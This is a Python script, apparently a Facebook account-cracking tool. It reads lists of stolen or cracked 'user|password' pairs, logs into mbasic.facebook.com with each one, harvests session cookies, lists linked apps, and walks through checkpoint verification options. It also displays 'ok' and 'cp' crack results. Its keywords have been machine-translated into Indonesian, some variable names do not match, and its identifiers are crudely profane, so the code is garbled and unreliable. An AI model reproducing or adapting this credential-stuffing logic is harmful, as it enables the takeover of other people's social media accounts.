		exit("\n%s [%s!%s] Berkas %s%s%s Tidak Ada!"%(p,m,p,h,berkas,p))
	untuk memek di buka_baju:
		kontol = memek.replace("\n","")
		titid = kontol.split("|")
		print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun : "+(kontol.replace(" + ","")))
		mencoba:
			dekura_chann(titid[0].replace(" + ",""), titid[1])
		kecuali request.exceptions.ConnectionError:
			lulus
	os.remove('checkcp.txt')
	exit("\n%s [%s!%s] Selesai Ya Anjing"%(p,m,p))

def dekura_chann(pengguna, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = permintaan.Sesi()
	#kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","Origin": mb ,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec- fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer ": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	daftar = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	untuk saya di fm.find_all("input"):
		jika i.get("nama") dalam daftar:
			data.update({i.get("name"):i.get("value")})
		kalau tidak:
			melanjutkan
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	jika "c_user" di ses.cookies:
		kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\". *?\">(.*?)<\/div>", str(td)) untuk td di run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))) )
		bilangan = 0
		untuk _ dalam xe:
			bilangan += 1
			print(" "+str(bil)+" "+_[0][0]+", "+_[0][1])
	elif "pos pemeriksaan" di ses.cookies:
		formulir = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["nilai"]
		jzst = form.find("input",{"name":"jazoest"})["nilai"]
		nh = form.find("input",{"name":"nh"})["nilai"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","kirim[Lanjutkan]":"Lanjutkan","nh": nh }
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text untuk yy di xnxx.find_all("option")]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Total Opsi Yang Tersedia "+str(len(ngew)))
		untuk keikutsertaan dalam rentang (len(ngew)):
			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" di str(jalankan):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	kalau tidak:
		print("%s[%s!%s] Kesalahan Masuk Gagal!\n"%(p,m,p))


#+#+#+#+#+#+#+#+#+#+#+#+#+##++##+#+#+#+#+#+#+#+#+# +++#+#

def cek_opsi_sesi():
	files = raw_input("\n %s[%s•%s] File yang berisi akun checkpoint\n %s[%s•%s] Files: "%(p,b,p,p,b,p) )
	mencoba:
		buka_baju = buka(file, "r").readlines()
	kecuali IOError:
		exit("\n%s [%s!%s] Berkas %s%s%s Tidak Ada!"%(p,m,p,h,berkas,p))
	untuk memek di buka_baju:
		kontol = memek.replace("\n","")
		titid = kontol.split("|")
		print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun : "+(kontol.replace(" + ","")))
		mencoba:
			dekucheck(titid[0].replace(" + ",""), titid[1])
		kecuali request.exceptions.ConnectionError:
			lulus
	os.remove('cp.txt')
	exit("\n%s [%s!%s] Selesai Ya Anjing"%(p,m,p))

def dekucheck(pengguna, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = permintaan.Sesi()
	#kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","Origin": mb ,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec- fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer ": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	daftar = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	untuk saya di fm.find_all("input"):
		jika i.get("nama") dalam daftar:
			data.update({i.get("name"):i.get("value")})
		kalau tidak:
			melanjutkan
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	jika "c_user" di ses.cookies:
		kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\". *?\">(.*?)<\/div>", str(td)) untuk td di run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))) )
		bilangan = 0
		untuk _ dalam xe:
			bilangan += 1
			print(" "+str(bil)+" "+_[0][0]+", "+_[0][1])
	elif "pos pemeriksaan" di ses.cookies:
		formulir = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["nilai"]
		jzst = form.find("input",{"name":"jazoest"})["nilai"]
		nh = form.find("input",{"name":"nh"})["nilai"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","kirim[Lanjutkan]":"Lanjutkan","nh": nh }
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text untuk yy di xnxx.find_all("option")]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Total Opsi Yang Tersedia "+str(len(ngew)))
		untuk keikutsertaan dalam rentang (len(ngew)):
			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" di str(jalankan):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	kalau tidak:
		print("%s[%s!%s] Kesalahan Masuk Gagal!\n"%(p,m,p))


############################################################# #####

hasil def():
    token global
    cek_ok = buka("ok.txt","r").read()
    cek_cp = buka("cp.txt","r").read()
    print("\n %s[%s1%s] Cek ok hasil crack\n %s[%s2%s] Cek cp hasil crack\n %s[%s0%s] Kembali ke menu"%(p,b ,p,p,b,p,p,b,p))
    cek_ress = raw_input("\n%s [%s•%s] Pilih: "%(p,b,p))
    jika cek_ress di ["1","01"]:
        jika len(cek_ok) != 0:
            print("\n %s[%s Hasil oke %s]%s\n"%(b,p,b,p));os.system("cat ok.txt")
        kalau tidak:
            print("\n %s[%s!%s] Hasil tidak ada!"%(p,m,p));os.sys.exit()
    elif cek_ress di ["2","02"]:
        if len(cek_cp) != 0:
            print("\n %s[%s Hasil cp %s]%s\n"%(b,p,b,p));os.system("cat cp.txt")
        kalau tidak:
            print("\n %s[%s!%s] Hasil tidak ada!"%(p,m,p));os.sys.exit()
    elif cek_ress di ["0","00"]:
        Tidak bisa()
    kalau tidak:
        exit("\n%s [%s!%s] Pilihan tidak ada!"%(p,m,p))

pengaturan def():
    token global
    print("\n%s [%s1%s] Setting user agent sendiri\n %s[%s2%s] Cek user agent sekarang"%(p,b,p,p,b,p))
    cek_deku = raw_input("\n%s [%s•%s] Pilih: "%(p,b,p))
    jika cek_deku di ["1","01"]:
        user_deku = raw_input("\n%s [%s•%s] User agent yang cantik mu\n %s[%s•%s] User agent: "%(p,b,p,p,b,p))
        print("%s [%s•%s] Mohon Tunggu!"%(p,b,p));time.sleep(1.5)
        buka("ua","w").write(user_deku)
        print("%s [%s•%s] Berhasil menetapkan agen pengguna"%(p,b,p))
        raw_input("%s [Kembali]"%(p))
        Tidak bisa()
    elif cek_deku di ["2","02"]:
        mencoba:
            ua = buka("ua", "r").read()
        kecuali IOError:
            ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
        print("%s [%s•%s] Agen pengguna sekrng: %s"%(p,b,p,ua))


def cek_folder_ok_cp():
    mencoba:
        buka("ok.txt","r").read()
    kecuali Pengecualian sebagai e:
        os.system("sentuh ok.txt")
    mencoba:
        buka("cp.txt","r").read()
    kecuali Pengecualian sebagai e:
        os.system("sentuh cp.txt")

jika __name__=="__main__":
    os.system("git tarik")
    os.system("sentuh login.txt")
    cek_folder_ok_cp()
    Tidak bisa()